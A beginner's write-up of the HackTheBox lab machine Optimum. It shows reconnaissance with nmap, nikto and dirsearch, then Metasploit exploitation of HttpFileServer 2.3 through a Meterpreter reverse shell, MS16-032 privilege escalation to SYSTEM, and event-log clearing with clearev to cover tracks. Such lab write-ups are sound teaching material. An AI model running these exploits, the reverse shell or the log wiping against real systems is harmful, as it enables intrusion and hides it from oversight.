# CTF Writeup: Optimum on HackTheBox
## 30 October 2017

### Introduction
This was one of my first capture the flags, and the first HTB to go retired while I had a good enough grasp of it to do a write up.
The steps are directed towards beginners, just like the box. 
Almost all the tools mentioned here can be found in a fresh Kali install - if they can't I'll mention it. The write up uses Kali Linux, but the tools used can be installed on/come with many pentesting distros like Blackarch. 

The terminal emulator used here is *Terminator*. It can split windows in half, open tabs and more.
You can get it with a simple `apt-get install terminator`

A few of the steps in this guide don't return hits - however, they are still important to include as part of a CTF routine.

In order to do this CTF, you need to have an account on HackTheBox.eu, and be connected to the HTB VPN. HackTheBox requires you to "hack" your way into an invite code - and explicitly forbids anyone from publishing writeups for that process, sorry.

## METHOD
#### (Step 0) Create `~/a_pentest` folder to save outputs to. `cd` into this directory before beginning.
You might want to have a CTFs folder to save your progress for posterity.

## 1. Scan the IP address using nmap

Whenever I get an IP for a CTF box, `nmap` is the first thing to do, every time.
The IP for this box is `10.10.10.8` - so we can run `nmap -sV -T4 10.10.10.8 | tee nmap_versionscan`
* The `-sV` flag tells nmap to attempt to identify the versions of  services it detects.
* The `-T4` increases the number of threads running `nmap` so the process goes faster.
* `| tee nmap_versionscan` will output the results to the screen, but also to a file called `nmap_versionscan` so we can review the results without running another scan.

![nmap scan](https://i.imgur.com/MHvM50h.png "nmap scan")

## 2. Explore the Webpage in the Browser
The scan gives several important pieces of information.
  1. The box is running an HTTP Server - that means we can visit a website in a browser, and use our HTTP tools.
  2. The HTTP Version: 'HttpFileServer httpd 2.3' - we can look for vulnerabilities in this process.
  3. The box is running Windows - this will help us form our strategy.
  
The first thing we should do is visit the web page and poke around.

![The Website](https://i.imgur.com/VRBMbwh.png "The Website")

First thing we see is "Login" - let's add that to the "might be useful" pile. We might try to log in later.

The box marked "Home" has 0 Folders, Files and bytes - so there probably won't be anything stored wherever that's pointing to.

At the bottom of the page we see "Server Information HTTPFileServer 2.3" - this corroborates and confirms our nmap scan results.
When you can take two pieces of information and use them to support one another you can make big steps forward to figure things out.
We can actually click on this, and it will take us to the website run by the HTTPFileServer Company.

Here I first tried to login with some common username and password pairs, as well as some contextual guesses.
I tried things like `admin:admin` `admin:password` `root:password` `root:root` `admin:fileserver`... with no successes.
We could try a brute forcing tool here later if we got stumped.

## 3. Use Other Tools To Explore The Website Further
The 3 main arrows in my website attack quiver are fimap (for spidering), Nikto (for vulnerability analysis) and dirsearch (for page/directory discovery) Let's try each one

### Spidering with fimap
fimap is used to 'spider' the web page - it follows every clickable thing on a page and returns a list of URLs, up to a certain depth. This happens much faster than if we tried to do it manually.

![fimap](https://i.imgur.com/6advaZL.png "fimap")

We can just run `fimap -H -d 3 -u http://10.10.10.8 -w /tmp/fimap_output` 
* The `-H` flag runs fimap in "URL Harvesting" (web spidering/crawling) mode.
* `-d 3` sets the "depth" to 3 pages. This means it will explore urls 3 "clicks" deep. If the first page (A) has 2 clickable links, and those links lead to 2 links each (B) , and THOSE links lead to 2 links each (C), fimap will stop looking after the C links. 
* `-u http://10.10.10.8` sets our target URL
* `-w ./fimap_output` will save the results to a file called `fimap_output` in the current directory.

If the crawl depth is set too high, we could end up clicking through half the internet!If you use a more complicated spiderer, such as the ones in OWASP ZAP and Burpsuite, you can set it so it only follows links within a certain scope. This will keep you on your own page and away from clicking on things like banner ads and links to Google.


Our spiderer didn't tell us too much. It only finds one link, which doesn't seem to even lead anywhere at all.
So, we move on to the next tool.

### Scanning for Vulnerabilities and Interesting Info with Nikto

Nikto is a great vulnerability scanner for websites. It will also check for things like robots.txt and search for interesting file and directory names.
Most of this happens behind the scenes, and it runs kind of slowly, so we will start it and come back.

![nikto start](https://i.imgur.com/pu6JATf.png "nikto start")

Run `nikto -h http://10.10.10.8` and open up a new terminal window or tab for our next tool.
(The -h flag just sets our target host IP)


### Page and Directory Bruteforcing
Not all pages on a website can be reached via clicking - sometimes you just need to know the URL.
There are a few methods of doing this, and the most obvious ones included in Kali are `dirb` and `dirbuster` which is a GUI for dirb.

However, I like to use [maurosoria's dirsearch](https://github.com/maurosoria/dirsearch) which is a python3 script that accomplishes the same thing with a bit more customization and speed. I cloned the repo into a directory called `/opt/Web_Tools/dirsearch` - but you can put it wherever you like.

![starting dirsearch](https://i.imgur.com/HpGpTXw.png "starting dirsearch")

run `python3 (PATH)/dirsearch.py -u http://10.10.10.8 -e txt,html,php | tee dirsearch_results`
 * `-u` just sets our URL
 * `-e txt,html,php` tells dirsearch to look for .txt, .html and .php files at our host.
 * The default dirsearch wordlist is pretty good, but you can specify another wordlists if you want to.

We can start this and go back to check on nikto. 

### Finishing Up Nikto

We can go back to our Nikto terminal, and it has finished!
Let's take a look.

![finishing nikto](https://i.imgur.com/SVGSfz3.png "finishing nikto")

What has it found?
 * `Server: HFS 2.3` again confirms that we are running the HTTPFileServer v2.3 - this has been triple confirmed.
 * Everything else refers to vulnerabilities we aren't particularly interested in, XSS and clickjacking are vulnerabilities that require user interaction, not something we will need to be concerned with on this CTF (and most other CTFs)
 
If the site had a robots.txt, or an /uploads/ directory, Nikto usually finds these things. 
Not that much new information, however, let's go back to dirsearch.


### Finishing Dirsearch

Let's see if dirsearch has turned anything up.

![finishing dirsearch](https://i.imgur.com/dLQvczX.png "finishing dirsearch")

A favicon is just a little icon that usually appears in a browser tab.
Dirsearch would have found things like a `login.php` or `/admin` or `id_rsa` page.

We haven't found anything interesting here, so we can move on to the next steps.


## 4. Searching for Exploits and Vulnerabilities

### Searchsploit Local Search

So far, the only information we have concretely confirmed is that the machine is running HTTPFileServer 2.3.

This is a pretty solid lead - let's see if we can find a way in.

`searchsploit` is a tool included in Kali that queries the exploitdb database for your search terms.
Many of the exploit scripts come included with it, and others run in Metasploit. 

Lets run a simple search for the found program. `searchsploit HTTPFileServer`

![searchsploit HTTPFileServer](https://i.imgur.com/ZD91sCq.png "searchsploit HTTPFileServer")

Hmm, no luck there. Nikto did refer to it as "HFS," however, so we can try that as well.

![searchsploit HFS](https://i.imgur.com/4ksJ1jf.png "searchsploit HFS")

Yes, that IS our version number 2.3 And that term, "Rejetto" - that's the website we reach when we click the link on the box's website.
There is a Metasploit module with Remote Code Execution, too. Remote Code Execution leads to shells, and shells lead to root access.

## Alternative Search Method: One Hundred Zeros

Did you know you have access to the most powerful source of knowledge ever devised by human beings?
If you ever have any thirst for knowledge - any question - anything you want to know about large and small, you can ask the Great Oracle of Modern Times, the Sage of Information...

*You should just Google it.*

Seriously. We live in the age of Bug Bounties and public disclosure. Unless you discover a 0day vulnerability, odds are a vulnerability can be found by searching online. Looking for a vulnerability in Windows Server? Search for it and soon you'll be reading about EternalBlue and WannaCry. Trying to find vulnerabilities in a certain program? Try searching for the program name and "CVE."

What about in our case?

![Googling HTTPFileServer](https://i.imgur.com/2e3gLym.png "Googling HTTPFileServer")

There it is, Remote Code Execution.

Let's try another search, including "metasploit" this time.

![Googling HTTPFileServer metasploit](https://i.imgur.com/hCveGMO.png "Googling HTTPFileServer metasploit")

This is how I found the vulnerability my first time on this box.



## 5a. Understanding Metasploit

Metasploit is a very powerful framework for pentesting. Seeing "Meterpreter session started" is the real life equivalent to that moment on TV when the hacker says "I'm in!" and starts typing faster for some reason.

The framework can be a bit tricky to interact with the first time you use it, but the methodology usually follows the same path. Here is a ridiculous analogy.

In front of you is a locked door that you know can be opened from the other side. First, you use your advanced dual-channel optical scanners (eyeballs) to see that there is a small space (vulnerability) underneath the door. You can't fit through, but luckily, you have your highly-trained utility hamster. This hamster is able to fit through the space under the door (exploit the vulnerability), and get to the other side. However, without any tools, the hamster won't be able to let you in once arriving! From your pocket, you pull out your hamster-sized grappling hook (payload) capable of grabbing the door handle on the other side and opening (gaining access to) the door.

You point out the space under the door to the hamster, hand him the grappling hook, and set him loose. He deftly scurries under the door, uses his little paws to swing the grappling hook up and over the door handle, and then uses all of his little might to pull down and swing open the door! Access granted, all thanks to our hero hamster.


That hamster's name? Metasploit.

![Metasploit](https://i.imgur.com/sVWEROh.jpg "Metasploit")


Here is the process:
* Identify a vulnerability
* Select the right metasploit Exploit module 
* Set a Payload
* Provide the appropriate parameters
* Run the module


## 5b. Using msfconsole

In our case, our vulnerability is found in the HTTPFileSystem/Rejetto. We already know an exploit module exists, and the default payload of the Meterpreter shell is just what we need. 

Run `msfconsole` to start up the metasploit console and see some nifty ASCII art.
Then run `search rejetto` to find our exploit.

![open msfconsole](https://i.imgur.com/vpAzE3P.png "open msfconsole")

It will find a result in less than a minute.

![found HFS exploit](https://i.imgur.com/yDipU0k.png "found HFS exploit")

From our results, we are given the path exploit/windows/http/rejetto_hfs_exec.

Now we need to `use` this exploit, so run `use exploit/windows/http/rejetto_hfs_exec`
Your terminal will acknowledge the exploit has been loaded by turning red.

In order to see our parameters, we enter `show options`

![HFS options](https://i.imgur.com/83BV2Ke.png "HFS Options")


If you look closely, you will see that some parameters are marked "yes" under the "Required" Column.
All of these required parameters must be set, and sometimes you need to set certain parameters that aren't even listed here.

Most of the time, your metasploit payload will require some sort of connection back to your computer. This means the localhost IP, called `LHOST` by metasploit, needs to be set. Often, metasploit will attempt to guess what this address is, and it frequently uses the wrong one.

Since we are connected to the HackTheBox VPN, we want to use our HTB IP, not our local network adresss. I always forget my IP, but we can quickly run `ifconfig` in another terminal to see what our `tun0` (yours might be `tun1` or something else depending on your network setup) address is. 
All HTB box addresses are `10.10.10.xxx` and your machine's address will be `10.10.xx.xx`

This exploit assumes we want to use the powerful Meterpreter reverse shell as our payload, and since Rejetto runs only on Windows, it will automatically use the Windows version of this payload.

Now that we know what we are doing, we can set our parameters.

* `set RHOST 10.10.10.8`  -  Tells metasploit Optimum's Address.
* `set LHOST 10.10.xx.xx`  -   Set this to your HTB IP, this is for the meterpreter connection
* `set SRVHOST 10.10.xx.xx`   -   Also set this to your HTB IP, it is for hosting the exploit file.
* `set LPORT 51000` - Set this value to your liking, but I like to use ports > 50,000 since they are dynamic.

![Initial Rejetto Expl Parameters](https://i.imgur.com/0leSr4g.png "Inital Rejetto Expl Parameters")

* `run`   -   With all our parameters set, we can turn our hamster loose.

![Initial Meterpreter Session Started](https://i.imgur.com/W90SIuQ.png "Initial Meterpreter Session Started")

[We're in.](https://media.giphy.com/media/YQitE4YNQNahy/giphy.gif) The first thing we'll want to do is gain more information about the system. 
Meterpreter has a set of commands based on Unix that work no matter what operating system it is running on.
You can view a [nice cheat sheet of these commands here.](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)

The command we want to run is `sysinfo` - this will tell us more about the system.

![sysinfo](https://i.imgur.com/iQepKBI.png "sysinfo")

If we look closely, we can see that something's not right here. 
Optimum's architecture is __x64__. Our meterpreter version is set to _x86_, not __x86_64__! If we are going to proceed, we are going to need to change this.

In your meterpreter shell, simply run `background` to go back to your msfconsole command line.
Then run `show options` again to see what payload metasploit assumed we wanted to use.

![default rejetto parameters](https://i.imgur.com/PtRK9FA.png "default rejetto parameters")

This is almost correct. The payload is set to `windows/meterpreter/reverse_tcp` - which connects back over a TCP port from a Windows machine. However, this doesn't specify an architecture, and defaults to x86, not x86_64. 
This is easy enough to fix, however. We just need to specify.

`set payload windows/x64/meterpreter/reverse_tcp`

![a new meterpreter](https://i.imgur.com/y8Bn1I1.png "a new meterpreter")

Since we have the other meterpreter still running, we need to set the `LPORT` again.

* `set LPORT 51001`
* `run`

![a new session](https://i.imgur.com/0PQHrip.png "a new session")
(note - sometimes this exploit will spawn you multiple sessions - just as a bonus! It has given me as many as 5!)

Now, we have the right type of meterpreter - let's move forward.

## 6. The User Flag and Privilege Escalation

The first thing we should do is grab the user flag. The convention of HTB boxes is that user and root flags are kept in those users' home or desktop directories. 

* `getuid` tells what user we are running as. 'kostas' doesn't sound like root.
* `pwd` Tells us our current working directory - the User's desktop, how convenient.
* `ls` Shows the files in this directory - `user.txt.txt` looks promising.
* `cat user.txt.txt` will output the contents of the user flag file to the screen. Copy them down and submit them on HackTheBox!

![Flag Captured!](https://i.imgur.com/zN1IZBL.png "Flag Captured!")

### What to do next? Any suggestions?

One of the advantages of the Meterpreter shell is scalability. Once you have in running on a machine, moving forward is made easier.
`post` modules are used post-exploitation, after you already have a meterpreter shell running on a machine.

Meterpreter has the ability to automatically search for information about the machine is it running on. 
It can use this information to find more vulnerabilities, and then suggest exploits to provide higher level access.

One module that is useful for this process is the `local_exploit_suggester` - which does exactly what you'd think.
It looks at the properties of the machine it is running on, and suggests exploit modules to use.

Run these commands:
* `use post/multi/recon/local_exploit_suggester` 
* `set SESSION 2` to point the exploit at our x64 meterpreter session
* Optionally, run `set SHOWDESCRIPTION true` if you want to have a detailed explanation of any suggested exploits.
* `run`

![Local Exploit Suggester](https://i.imgur.com/aLLt4cC.png "Local Exploit Suggester")

Well, it ran - but it didn't come up with any suggestions. Let's see if we can find anything ourselves.

* `sessions 2` will take us back to our x64 meterpreter session
* `sysinfo` will give us some info to start searching for exploits - Windows 2012 R2, x86_64.

### We have a technical question - how can we find an answer?

Let us ask the Oracle for guidance!

![Asking the Oracle for guidance](https://i.imgur.com/rSLt5R7.png "Asking the Oracle for guidance")

The first hit gives us a nice MS vulnerability number, `MS16-032` 
The "16" means it is from 2016, meaning it takes advantage of a relatively new vulnerability, that's a good sign.
Let's search for this in metasploit and see if we have any modules.

![msfconsole ms16-032 search](https://i.imgur.com/MkSyF8y.png "msfconsole ms16-032 search")

Jackpot!

## 7. Trying Out the Privesc Module and the System Flag

Let's load it up and give it a whirl.

* `use exploit/windows/local/ms16_032_secondary_logon_handle_privesc`
* `show options` to see what parameters we need to set


![ms16-032 default parameters](https://i.imgur.com/JBTs6Xp.png "ms16-032 default parameters")


See the `Targets` Section? We need to specify our architecture again.
Make sure our payload has the right architecture too. Then, set the other parameters.

* `show targets`
* `set TARGET 1` to specify x64
* `set SESSION 2` __Note that this command was run before screenshot below was taken, it is REQUIRED__
* `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
* `set LHOST 10.10.xx.xx`
* `set LPORT 51003` 
* `run`

![Session 4 started!](https://i.imgur.com/TJ6TjKE.png "Session 4 Started!")

It worked! We should first see who/where we are, and then see if we can capture the flag.

* `getuid` - should output NT AUTHORITY\SYSTEM. This is Windows-Speak for "All-Powerful Admin Root Master"
* `pwd` - see where we are and how we can navigate to the admin's desktop.
* `cd /Users/`
* `ls` - from here we can see all the User directories, including Administrator.
* `cd Administrator/Desktop` - we know this is where our flag can be found.
* `ls` 
* `cat root.txt` - system flag captured!

![System flag captured!](https://i.imgur.com/PDbe4y9.png "System flag captured!")

### 8. Cleanup

Since this is a CTF, cleanup isn't mandatory. However, we want to develop good habits and operational security practice.
Meterpreter has a `clearev` command that can be used to cover our tracks - let's run it and be out of here.

* `clearev`
* `exit -y` the `-y` flag answers "Kill the session?" in advance.


![Cleaning Up](https://i.imgur.com/L9o2Zhs.png "Cleaning Up")

* `exit -y` again will kill the other sessions and exit msfconsole.


And that's Optimum!




### Thanks for reading!





